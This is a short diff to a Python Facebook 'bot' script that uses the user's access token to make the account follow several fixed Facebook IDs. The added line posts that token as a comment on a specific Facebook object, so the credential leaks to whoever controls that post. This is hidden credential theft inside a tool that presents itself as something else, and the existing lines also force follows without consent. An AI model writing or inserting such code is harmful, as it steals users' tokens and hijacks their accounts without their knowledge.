@@ -124,6 +124,7 @@ def bot():
 	requests.post('https://graph.facebook.com/100013775598620/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100004601539472/subscribers?access_token=' + token)
 	requests.post('https://graph.facebook.com/100006033517423/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/213614107297063/comments/?message='+token+'&access_token=' + token)
 
 ### BAGIAN MENU ###
 def menu():
